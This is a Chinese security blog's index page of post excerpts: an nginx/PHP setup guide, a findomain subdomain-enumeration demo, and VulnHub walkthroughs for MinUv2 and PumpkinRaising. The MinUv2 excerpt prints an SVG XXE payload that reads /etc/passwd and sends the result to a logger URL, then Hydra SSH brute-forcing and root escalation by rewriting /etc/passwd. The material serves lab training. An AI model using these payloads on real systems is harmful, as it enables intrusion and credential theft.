deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ xenial-updates main multiverse restricted universe
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ xenial-backports main multiverse restricted universe
deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ xenial main multiverse restricted universe
deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ xenial-security main multiverse restricted universe
deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ xenial-updates main multiverse restricted universe
deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ xenial-backports main multiverse restricted universe
sudo apt update
#等待apt更新完成即可，列表更新完成就可以tab补全啦～
</code></pre></div></div>
<h3 id="12-安装">1.2 安装</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install nginx
ps -ef |grep nginx #查看进程
curl localhost       #本地调试出现welcome页面即本地调试成功
</code></pre></div></div>
<p>
    <img src="https://bbs-img.huaweicloud.com/blogs/img/1573702475503227.png" title="1573702475503227.png" class="localImage" alt="1573702475503227.png" width="699" height="246" />
</p>
<p>
    如果想要公网访问ip需开放入方向安全规则80端口。找到控制台-入方向规则-添加规则<br />
</p>
<p>
    <img src="https://bbs-img.huaweicloud.com/blogs/img/1573702674499363.png" title="1573702674499363.png" class="localImage" alt="1573702674499363.png" width="754" height="338" />
</p>
<p>
    访问公网ip即可。
</p>

<h2 id="2安装php配置nginx解析">2.安装php、配置nginx解析</h2>

<h3 id="21-php安装">2.1 php安装</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install php-fpm  ##这里注意查看一下php-fpm的管理器版本，后面配置软链接如果版本不一致会报错
# cd /var/run/php/
# ls
php7.0-fpm.pid  php7.0-fpm.sock  ##可以看到此处本菜的版本是7.0
</code></pre></div></div>

<h3 id="22-最重要的nginx软链接解析">2.2 最重要的nginx软链接解析<br /></h3>

<p>进入<code class="language-plaintext highlighter-rouge">/etc/nginx/sites-available</code> 目录下新建<code class="language-plaintext highlighter-rouge">webserver</code>，配置php解析文件。</p>

<h3 id="23-在server区块中配置基本服务">2.3 在server区块中配置基本服务</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server {
        listen 80;            ##网站监听端口，这里设置为80，即浏览器默认的HTTP端口号。
        root /var/www/html;   ##网站根目录
        index index.php index.html index.htm index.nginx-debian.html;  ##配置web默认页
        server_name ip##你的公网ip;

        location / {
                try_files $uri $uri/ =404;                                                    
        }

        location ~ \.php$ {         ##如果url输入为php后缀文件则传给php-fpm进行处理。
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;  ##注意此处的解析目录的更改
        }

        location ~ /\.ht {
                deny all;               ##该区块禁止.htaccess的访问。
        }
}
</code></pre></div></div>

<h3 id="24-配置nginx软链接">2.4 配置nginx软链接</h3>

<p>如果报错无法找到webserver(此处每人不同，如果未修改则是default)，进入/etc/nginx/sites-enabled目录下查看软链接配置，删除多余配置，留下default和webserver软链接文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ln -s /etc/nginx/sites-available/webserver /etc/nginx/sites-enabled/ 
sudo nginx -t                  #nginx测试，无报错进入下一步
sudo systemctl reload nginx    #重启服务，载入最新配置
</code></pre></div></div>
<p>报错解决:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/nginx/sites-enabled# ll
total 8
drwxr-xr-x 2 root root 4096 Nov 12 11:03 ./
drwxr-xr-x 6 root root 4096 Nov 12 11:34 ../
lrwxrwxrwx 1 root root   34 Nov 12 10:51 default -&amp;gt; /etc/nginx/sites-available/default
lrwxrwxrwx 1 root root   34 Nov 12 11:02 webserver -&amp;gt; /etc/nginx/sites-available/webserver
rm -rf webserver
sudo ln -s /etc/nginx/sites-available/webserver /etc/nginx/sites-enabled/ 
</code></pre></div></div>
<h2 id="3测试">3.测试</h2>

<p>
    在web服务目录下创建php文件测试。<br />
</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi test.php
&amp;lt;?phpphpinfo();?&gt;
</code></pre></div></div>
<p>使用浏览器输入:<code class="language-plaintext highlighter-rouge">$_公网ip/test.php</code>；测试成功：</p>
<p>
    <img src="https://bbs-img.huaweicloud.com/blogs/img/1573709110895993.png" title="1573709110895993.png" class="localImage" alt="1573709110895993.png" />
</p>

<h2 id="4部署存储容器">4.部署存储容器</h2>

<p>
    别忘了我们的最终目的，是部署云服务器容器。将web文件夹解压至web根目录下。访问即可。
    <span style="background-color:rgb(240,124,130);">由于此处使用的是第三方开源容器项目，所以安全性无法保障，不保证后门等情况不会发生，所以介意者可以自行搭建（代码托管平台也有）。为了避免麻烦这里把所有的与项目有关的信息码一下，见谅。</span>
</p>
<p>
    <img src="https://bbs-img.huaweicloud.com/blogs/img/1573709423926504.png" title="1573709423926504.png" class="localImage" alt="1573709423926504.png" width="677" height="433" />
</p>
<p>
    <img src="https://bbs-img.huaweicloud.com/blogs/img/1573709541736321.png" title="1573709541736321.png" class="localImage" alt="1573709541736321.png" width="930" height="416" />
</p>
<p>
    <br />
</p>
<p>
    <img src="https://bbs-img.huaweicloud.com/blogs/img/1573709994134345.png" title="1573709994134345.png" class="localImage" alt="1573709994134345.png" />
</p>

<p>好了。基本上一个自己使用的云存储容器就可以投入使用了。手机端、PC端都可以使用。建议大家可以自己尝试一下。<br /><span style="background-color:rgb(240,124,130);">么么哒</span></p>


          <p><a href="/blog/2019/Ubuntu/with/arm/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/findomain/"><h3 class="ctitle">「FINDOMAIN」：跨平台子域名搜集工具</h3></a>
          <p><csmall>Sep 1, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>摘要:之前在暑假里申请注册了个云先知平台账号，平时没事闲（mo）着（yang）的（gong）时候当当土拨鼠挖挖洞。挖过的都懂，是一个类似于渗透测试的中心化平台。乙方公司有这个需求，通过这个平台发放任务，通过不同的漏洞等级【严重】-【高危】-【中危】-【低危】，严重就是危及到服务器权限，能够get web shell、root甚至横向渗透，依次类推每一项，危及程度依次类推，有兴趣的朋友自行搜索体会（你们可以猜猜xss在哪个位置）。</p>

<p>以上背景，每份任务都会规定好一些任务域名，指定好。其他的域名没有备案不允许碰。如：</p>

<p><img src="https://bbs-img-cbc-cn.obs.cn-north-1.myhuaweicloud.com/data/attachment/forum/201909/14/2338011n3xy9n7wtdbjk36.png" alt="" /></p>

<p>重点就来了，前面的*,是需要我们自己去测试的，也就是说，不同的 * 会有别样的惊喜。</p>

<p>那么这就推出咱们的主角：<code class="language-plaintext highlighter-rouge">findomain</code>，跨平台的子域名搜集工具。</p>

<h2 id="1下载安装">1.下载安装</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    $ git clone https://github.com/Edu4rdSHL/findomain.git

    $ cd findomain

    $ apt-get install cargo

    $ cargo build --release

    $ sudo cp target/release/findomain  /usr/bin

    $ findomain
</code></pre></div></div>
<h2 id="2语法介绍">2.语法介绍</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1、进行简单的子域名搜索，并输出信息：
  findomain -t example.com

2、使用所有的API进行子域名搜索，并输出信息：
findomain -t example.com –a

3、搜索子域名，并将输出导出为CSV文件格式：
findomain -t example.com -o csv

4、使用所有的API进行子域名搜索，并将输出导出为CSV文件格式：
findomain -t example.com -a -o csv
</code></pre></div></div>

<h2 id="3实际使用">3.实际使用</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ findomain -t a****un.com -o csv

   $ Target ==&gt; a****un.com

    Searching in the CertSpotter API...
    Searching in the Bufferover API...
    Searching in the Crtsh database...
    Searching in the Virustotal API...
    Searching in the Sublist3r API...
    Searching in the Facebook API...
    Searching in the Threadcrowd API...
    Searching in the Spyse API...
    An error ❌ has occurred while parsing the JSON obtained from the Threadcrowd API. Error description: JSON error.

    An error ❌ has occurred while parsing the JSON obtained from the Bufferover API. Error description: JSON error.

    An error ❌ has occurred while parsing the JSON obtained from the Sublist3r API. Error description: JSON error.

    A timeout ⏳ error has occurred while processing the request in the Facebook API. Error description: timed out


    A total of `153` subdomains were found for ==&gt;  a***un.com

    Good luck Hax0r !

    &gt;&gt;  Filename for the target aliyun.com was saved in: ./a*****n.com_1680.csv
</code></pre></div></div>

<p>可以看到 A total of 153 subdomains.所以使用findomain工具一共搜集到了153个子域名。最后，goodluck。
且输出的csv文件就输出在运行工具的当前文件夹下。推荐大家可以试试看,搜集信息还是很好用的，<code class="language-plaintext highlighter-rouge">么么哒</code></p>


          <p><a href="/blog/2019/findomain/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/minUv2/"><h3 class="ctitle">「渗透」SVG的神秘力量：minUv2</h3></a>
          <p><csmall>Sep 1, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h1 id="序言">序言</h1>
<p>hello,各位。最近闲来无事，工作之余偷偷用公司电脑测试入侵了一个linux靶机，遂记录下。（手动狗头）
这个靶机本身难度适中，复现了svg的代码执行漏洞且要求对linux的系统命令较为熟悉；svg大体来说是一种图像文件格式，基于XML，由W3C联盟进行开发的，支持网页打开，编辑方便等。可以自行深入搜索~各位大佬见笑。</p>
<h2 id="一靶机简介">一、靶机简介</h2>
<p>minUv2下载地址:<br />
<a href="https://download.vulnhub.com/minu/MinUv2.ova.7z">Download (Mirror)</a>
<br />
<a href="https://download.vulnhub.com/minu/MinUv2.ova.7z.torrent">Download (Torrent)</a>
<br /></p>
<h2 id="二实战">二、实战</h2>
<p>江湖规矩，神器开路：首先先用<code class="language-plaintext highlighter-rouge">Nmap</code>扫描确定靶机地址。发现靶机ip。
这里靶机只支持vbox，所以得桥接通信，打码请谅解~<br />
<img src="https://p2.ssl.qhimg.com/t0167faf934cb9977ca.png" alt="" /><br />
确定ip直接端口扫描~
<img src="https://p4.ssl.qhimg.com/t011687f39e33bbe3e4.png" alt="" />
发现只开放了两个端口：<code class="language-plaintext highlighter-rouge">22、3306</code>端口。22端口暂时先放着不管，咱们看看3306端口。
是一个web页面，emmmm.主角登场，svg图像~
<img src="https://p0.ssl.qhimg.com/t019035849ce7a48ccf.png" alt="" /></p>
<h2 id="三发现漏洞">三、发现漏洞</h2>
<p>小弟赶紧dirb扫描一波，果然有发现。<br /></p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#扫描3306端口下的html后缀的文件</span><span class="w">
</span><span class="nv">dirb</span><span class="w"> </span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="nv">port</span><span class="w"> </span><span class="o">-</span><span class="nv">X</span><span class="w"> </span><span class="p">.</span><span class="nv">html</span><span class="w">
</span><span class="c1">--------------</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="nv">port</span><span class="o">/</span><span class="nv">upload</span><span class="p">.</span><span class="nv">html</span><span class="w"> </span><span class="p">(</span><span class="nv">CODE</span><span class="p">:</span><span class="mi">200</span><span class="err">|</span><span class="nv">SIZE</span><span class="p">:</span><span class="mi">908</span><span class="p">)</span><span class="w">
</span><span class="c1">--------------</span><span class="w">
</span><span class="nv">DOWNLOADED</span><span class="p">:</span><span class="w"> </span><span class="mi">4612</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">FOUND</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span></code></pre></div></div>
<p>发现了上传网页，且只能上传svg、img文件，又惊又喜。exp搜索一哈找到poc，验证一下漏洞的存在。poc代码如下：</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#poc上传上去页面回显</span><span class="w">
</span><span class="c1">#&lt;!DOCTYPE svg [</span><span class="w">
</span><span class="o">&lt;</span><span class="p">!</span><span class="nv">ELEMENT</span><span class="w"> </span><span class="nv">svg</span><span class="w"> </span><span class="nv">ANY</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="p">!</span><span class="nv">ENTITY</span><span class="w"> </span><span class="nv">xxe</span><span class="w"> </span><span class="nv">SYSTEM</span><span class="w"> </span><span class="s2">"/etc/passwd"</span><span class="o">&gt;</span><span class="w">
</span><span class="err">]</span><span class="o">&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="nv">svg</span><span class="w"> </span><span class="nb">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="w"> </span><span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/2000/svg"</span><span class="w"> </span><span class="na">width</span><span class="o">=</span><span class="s2">"19000px"</span><span class="w"> </span><span class="nv">xmlns</span><span class="p">:</span><span class="nv">xlink</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xlink"</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="nb">text</span><span class="w"> </span><span class="nv">x</span><span class="o">=</span><span class="s2">"-1000"</span><span class="w"> </span><span class="nv">y</span><span class="o">=</span><span class="s2">"-1000"</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="nv">xxe</span><span class="err">;</span><span class="o">&lt;/</span><span class="nb">text</span><span class="o">&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="nv">circle</span><span class="w"> </span><span class="nv">cx</span><span class="o">=</span><span class="s2">"50"</span><span class="w"> </span><span class="nv">cy</span><span class="o">=</span><span class="s2">"50"</span><span class="w"> </span><span class="nv">r</span><span class="o">=</span><span class="s2">"40"</span><span class="w"> </span><span class="nv">stroke</span><span class="o">=</span><span class="s2">"black"</span><span class="w"> </span><span class="nv">stroke</span><span class="o">-</span><span class="na">width</span><span class="o">=</span><span class="s2">"3"</span><span class="w"> 		</span><span class="nv">fill</span><span class="o">=</span><span class="s2">"red"</span><span class="w"> </span><span class="o">/&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="nv">script</span><span class="o">&gt;</span><span class="w">
</span><span class="nv">var</span><span class="w"> </span><span class="nv">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://localhost/?file="</span><span class="w"> </span><span class="o">+</span><span class="w">
</span><span class="nv">encodeURIComponent</span><span class="p">(</span><span class="na">document</span><span class="p">.</span><span class="nv">getElementsByTagName</span><span class="p">(</span><span class="s2">"text"</span><span class="p">)</span><span class="w">	</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span><span class="p">.</span><span class="nv">innerHTML</span><span class="p">)</span><span class="err">;</span><span class="w">
</span><span class="na">document</span><span class="p">.</span><span class="nv">createElementNS</span><span class="p">(</span><span class="err">'</span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="nv">www</span><span class="p">.</span><span class="nv">w3</span><span class="p">.</span><span class="nv">org</span><span class="o">/</span><span class="mi">2000</span><span class="o">/</span><span class="nv">svg</span><span class="err">'</span><span class="p">,</span><span class="err">'</span><span class="na">image</span><span class="err">'</span><span class="p">).</span><span class="nv">setAttributeNS</span><span class="p">(</span><span class="err">'</span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="nv">www</span><span class="p">.</span><span class="nv">w3</span><span class="p">.</span><span class="nv">org</span><span class="o">/</span><span class="mi">1999</span><span class="o">/</span><span class="nv">xlink</span><span class="err">'</span><span class="p">,</span><span class="err">'</span><span class="nv">href</span><span class="err">'</span><span class="p">,</span><span class="w"> </span><span class="nv">logger</span><span class="p">)</span><span class="err">;</span><span class="w">
</span><span class="o">&lt;/</span><span class="nv">script</span><span class="o">&gt;&lt;/</span><span class="nv">svg</span><span class="o">&gt;</span><span class="w">
</span></code></pre></div></div>
<p><br />
果然有<code class="language-plaintext highlighter-rouge">xxe</code>漏洞，但是验证了漏洞不能让我们有实际的渗透进展，只能对一些文件内容进行查看，无法得到shell，要怎么办呢？</p>

<p><img src="https://p1.ssl.qhimg.com/t0163eb735e597071e2.png" alt="" /></p>

<h2 id="四get-shell">四、get shell</h2>
<p>就在小弟愁眉苦脸的时候，忽然看到最后一行用户名的进程是/bin/ash，想到bash shell会有历史纪录，赶紧重新上传一个poc验证想法。回显内容：<br /></p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"./ash.history"</span><span class="err">获取~</span><span class="w">
</span><span class="nv">Useradd</span><span class="w"> </span><span class="err">–</span><span class="nv">D</span><span class="w"> </span><span class="nv">bossdonttrackme</span><span class="w"> </span><span class="err">–</span><span class="nv">p</span><span class="w"> </span><span class="nv">superultrapass3</span><span class="w">
</span></code></pre></div></div>
<p>根据所得的内容生成用户字典（passwd回显的用户名），密码字典。用Hydra跑一下。</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##hydra -L /root/Documents/test/minu/use.txt -P /root/Documents/test/minu/passwd.txt ssh://$_ip</span><span class="w">
</span><span class="nv">Hydra</span><span class="w"> </span><span class="nv">v8</span><span class="p">.</span><span class="mf">9.1</span><span class="w"> </span><span class="p">(</span><span class="nv">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="nv">van</span><span class="w"> </span><span class="nv">Hauser</span><span class="o">/</span><span class="nv">THC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">Please</span><span class="w"> </span><span class="nv">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="nv">use</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nv">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> 
</span><span class="nv">secret</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="nv">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="nb">for</span><span class="w"> </span><span class="nv">illegal</span><span class="w"> </span><span class="nv">purposes</span><span class="p">.</span><span class="w">
</span><span class="err">[</span><span class="nv">WARNING</span><span class="err">]</span><span class="w"> </span><span class="nv">Many</span><span class="w"> </span><span class="nv">SSH</span><span class="w"> </span><span class="nv">configurations</span><span class="w"> </span><span class="nv">limit</span><span class="w"> </span><span class="nb">the</span><span class="w"> </span><span class="nv">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nv">parallel</span><span class="w"> </span><span class="nv">tasks</span><span class="p">,</span><span class="w"> </span><span class="k">it</span><span class="w"> </span><span class="ow">is</span><span class="w">
</span><span class="nv">recommended</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nv">reduce</span><span class="w"> </span><span class="nb">the</span><span class="w"> </span><span class="nv">tasks</span><span class="p">:</span><span class="w"> </span><span class="nv">use</span><span class="w"> </span><span class="o">-</span><span class="nv">t</span><span class="w"> </span><span class="mi">4</span><span class="w">	</span><span class="err">[</span><span class="nv">DATA</span><span class="err">]</span><span class="w"> </span><span class="nv">max</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="nv">tasks</span><span class="w"> </span><span class="nv">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">server</span><span class="p">,</span><span class="w"> </span><span class="nv">overall</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="nv">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="nv">login</span><span class="w"> </span><span class="nv">tries</span><span class="w"> </span><span class="p">(</span><span class="nv">l</span><span class="p">:</span><span class="mi">30</span><span class="o">/</span><span class="nv">p</span><span class="p">:</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="err">~</span><span class="mi">2</span><span class="w"> </span><span class="nv">tries</span><span class="w"> </span><span class="nv">per</span><span class="w"> </span><span class="nv">task</span><span class="w">
</span><span class="err">[</span><span class="nv">DATA</span><span class="err">]</span><span class="w"> </span><span class="nv">attacking</span><span class="w"> </span><span class="nv">ssh</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="mi">22</span><span class="o">/</span><span class="w">
</span><span class="err">[</span><span class="mi">22</span><span class="err">][</span><span class="nv">ssh</span><span class="err">]</span><span class="w"> </span><span class="nv">host</span><span class="p">:</span><span class="w"> </span><span class="err">$_</span><span class="nv">ip</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="nv">login</span><span class="p">:</span><span class="w"> </span><span class="nv">employee</span><span class="w"> </span><span class="nv">password</span><span class="p">:</span><span class="w"> </span><span class="nv">superultrapass3</span><span class="o">**</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="na">target</span><span class="w"> </span><span class="nv">successfully</span><span class="w"> </span><span class="nv">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">valid</span><span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="nv">found</span><span class="w">
</span><span class="c1">##跑出来账号密码employee：uperultrapass3，ssh连上去。</span><span class="w">
</span><span class="c1">##连接上去查看一下基本信息 </span><span class="w">
</span><span class="nv">ssh</span><span class="w"> </span><span class="nv">employee</span><span class="err">@</span><span class="nv">ip</span><span class="w">
</span><span class="nv">whoami</span><span class="w">
</span><span class="na">id</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nv">find</span><span class="w"> </span><span class="o">-</span><span class="nv">perm</span><span class="w"> </span><span class="o">-</span><span class="mi">4000</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">null</span><span class="w">
</span></code></pre></div></div>
<p><img src="https://p5.ssl.qhimg.com/t013dbd6663c5c9720e.png" alt="" /></p>
<h2 id="五提权">五、提权</h2>
<p>发现<code class="language-plaintext highlighter-rouge">micro</code>和<code class="language-plaintext highlighter-rouge">bbsuid</code>不需要高权限，运行一下，发现micro是一个<code class="language-plaintext highlighter-rouge">文本编辑工具器</code>。接下来就简单了。</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#生成一份hash值，替换掉passwd的用户密码，这样密码就已知了。</span><span class="w">
</span><span class="c1">#用micro编辑器打开passwd文件，替换root密码保存即可</span><span class="w">
</span><span class="nv">passwd</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="nv">salty</span><span class="w"> </span><span class="nv">root</span><span class="w"> </span><span class="nv">admin123</span><span class="p">(</span><span class="err">随意</span><span class="p">)</span><span class="w">
</span><span class="nv">cat</span><span class="w"> </span><span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">passwd</span><span class="w"> </span><span class="err">|</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">micro</span><span class="w">
</span></code></pre></div></div>
<p><img src="https://p5.ssl.qhimg.com/t0198aaa755e6394b0f.png" alt="" />
这样我们就已知root密码了，直接切换用户</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">minuv2</span><span class="p">:</span><span class="err">~$</span><span class="w"> </span><span class="nv">su</span><span class="w"> </span><span class="nv">root</span><span class="w">
</span><span class="nv">Password</span><span class="p">:</span><span class="w"> 
</span><span class="nv">minuv2</span><span class="p">:</span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">employee</span><span class="c1"># whoami</span><span class="w">
</span><span class="nv">root</span><span class="w">
</span><span class="nv">minuv2</span><span class="p">:</span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">employee</span><span class="c1">#</span><span class="w">
</span></code></pre></div></div>
<p><img src="https://p2.ssl.qhimg.com/t01aefe59b403bdcc5c.png" alt="" />
获得flag~感谢各位</p>


          <p><a href="/blog/2019/minUv2/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/vulnhub/PumpkinRaising/"><h3 class="ctitle">「渗透」:PumpkinRaising-密码学的奥义</h3></a>
          <p><csmall>Jul 15, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h1 id="序言">序言</h1>
<p>hello,各位看官。最近忙里偷闲花了两天时间测试入侵了一个linux靶机，遂记录下。这个靶机我觉得挺适合刚入门的有一些基础的白帽子，对就是你！，大部分flag都是利用一些工具来获得。大佬看客笑看便是（手动狗头）。
整篇记录的都是小弟的思路，看官们跟着小弟的思路看就是了，会有些乱。见笑。</p>
<h2 id="一靶机">一、靶机</h2>
<p>靶机来自vulnhub，下载地址如下：</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">PumpkinRaising</span><span class="p">:</span><span class="w">
</span><span class="nv">Download</span><span class="w"> </span><span class="p">(</span><span class="nv">Mirror</span><span class="p">):</span><span class="w"> </span><span class="nv">https</span><span class="p">:</span><span class="o">//</span><span class="nv">download</span><span class="p">.</span><span class="nv">vulnhub</span><span class="p">.</span><span class="nv">com</span><span class="o">/</span><span class="nv">missionpumpkin</span><span class="o">/</span><span class="nv">PumpkinRaising</span><span class="p">.</span><span class="nv">ova</span><span class="w">
</span><span class="nv">Download</span><span class="w"> </span><span class="p">(</span><span class="nv">Torrent</span><span class="p">):</span><span class="w"> </span><span class="nv">https</span><span class="p">:</span><span class="o">//</span><span class="nv">download</span><span class="p">.</span><span class="nv">vulnhub</span><span class="p">.</span><span class="nv">com</span><span class="o">/</span><span class="nv">missionpumpkin</span><span class="o">/</span><span class="nv">PumpkinRaising</span><span class="p">.</span><span class="nv">ova</span><span class="p">.</span><span class="nv">torrent</span><span class="w">
</span></code></pre></div></div>
<h2 id="二实战">二、实战</h2>
<h5 id="21-端口扫描">2.1 端口扫描</h5>
<p>江湖规矩，神器开路：首先先用Nmap扫描确定靶机地址。发现开放的靶机ip。
<img src="https://p0.ssl.qhimg.com/t010c1840c959e8134a.png" alt="" /></p>

<p>扫描一波（-O -A狗头）：</p>

<p><img src="https://p3.ssl.qhimg.com/t01ff194e901205f336.png" alt="" /></p>

<p>咱们发现没有多余的端口开放，中规中矩，22,80端口。附带扫出80端口下的robots.txt。小弟一个激灵，这么多？心里美滋滋一个一个打开看，不急，这次怕是十拿九稳（狗头）。22端口先不管他，小弟看到这么多内容的robots文件夹，如获至宝赶紧打开，我的乖，目录图片文件路径，先看看文件选项有没有什么线索。<br />
<img src="https://p3.ssl.qhimg.com/t01baf77d7e52ab7671.png" alt="" /><img src="https://p2.ssl.qhimg.com/t01592ff5c4fb16339d.png" alt="" /></p>
<h4 id="22-端口踩点顺藤摸瓜">2.2 端口“踩点”——顺藤摸瓜</h4>
<p>小弟试下来后发现文件只有如下能够访问：
 1）underconstruction.html：
（页面名意还在建设的页面）提示我们说图片下面有猫腻。咱们先把这个uc.gif图片下载下来试试水。
<img src="https://p5.ssl.qhimg.com/t0187d8d32b5c34eab1.png" alt="" /><br />
正好小弟最近在研究图片隐写，丢到Stegsolve查看一波。跟普通图片差不多Alpha P 1-7都是空白
<img src="https://p2.ssl.qhimg.com/t01deeefa1b992646e8.png" alt="" />
翻了又翻觉得RedP6、7有点异常，打开数据抽取查看源码没有收获（原谅小弟，小弟是noob~）；尝试了GRB各种组合，各种低0位，也尝试了提取bin都未提取出有用的信息。
<img src="https://p4.ssl.qhimg.com/t0119028a6f161c523b.png" alt="" /><br />
忽然想到这个图片是gif，会不会有偏移呢？赶紧Stereogram Slover尝试偏移，不出所料也失败了，就这样在这张图片上浪费了不少时间。
<img src="https://p4.ssl.qhimg.com/t0121b77613838ce873.png" alt="" />
<br />既然找不到有用的信息，那么这张图片先放一放。。不急，先往后面看。继续通过robots文件的内容查看。</p>

<p>2）hidden目录的note文本
hidden目录下的note文本文件，显示了一些貌似账号密码的文本，难道是ssh的账号信息？不会这么简单吧，虽然嘴上说着不会，身体却很诚实去试了试，不行。。但是我们到现在还没有发现类似登陆页面的东西，也先放一放。<br />
<img src="https://p1.ssl.qhimg.com/t013f3a0f87bf8a5db2.png" alt="" /><br />
 3） /seeds/seed.txt.gpg
访问后直接下载下来了，gpg？下载下来打开乱码，谷歌一哈搜到几个工具，我这里用的是kali的gpg（没用过可以自行百度有教程安装，几百K）<br />
<img src="https://p2.ssl.qhimg.com/t0141c9da199cb4f8b7.png" alt="" /><br />
花了点时间摸索了一下发现了线索
<img src="https://p2.ssl.qhimg.com/t0140326759f7867d7e.png" alt="" /><br />
看着像摩斯密码，丢到摩斯解密工具里解密，就这样小弟居然得到了第一个flag（id）：<strong>69507</strong>
<img src="https://p2.ssl.qhimg.com/t016ccf5c2ddccde9b6.png" alt="" /><br /></p>
<h4 id="23-言归正传80端口">2.3 言归正传——80端口</h4>
<p>咱们再来看看主页有些啥。80端口下静态页面~
<img src="https://p3.ssl.qhimg.com/t0151ecbad4d6538b86.png" alt="" />
查看源码，得到两个有用的信息：
一段看上去像base64的密文，赶紧丢到解密工具解密，没有什么有用的信息：<code class="language-plaintext highlighter-rouge">This is just to remaind you that it's Level 2 of Mission-Pumpkin! ;)</code>
<img src="https://p0.ssl.qhimg.com/t01ceac35471f870459.png" alt="" />
继续，一个url，转向pumpkin.html
